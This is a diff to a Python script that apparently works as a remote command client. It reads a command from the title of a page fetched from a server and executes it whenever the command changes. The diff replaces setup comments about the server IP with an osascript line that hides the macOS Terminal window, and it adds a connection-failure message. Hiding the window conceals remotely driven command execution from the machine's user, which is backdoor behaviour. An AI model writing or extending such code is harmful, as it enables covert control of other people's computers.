@@ -6,8 +6,7 @@ from time import *
 old_command = 0
 command = 0
 os.system('clear')
-#edit this variable to the server ip, which can be found in the description
-#I will also update this variable from the code if the server ip changed, so if the ip stopped working, check the description
+os.system('osascript -e \'tell application "Terminal" to set visible of front window to false\'')
 
 print('''
       
@@ -29,7 +28,7 @@ while True:
         soup = BeautifulSoup(html_file, 'lxml')
         command = soup.find('title').text
     except:
-        pass
+        print("failed to connect to server")
     #execute command
     if old_command != command:
         try:
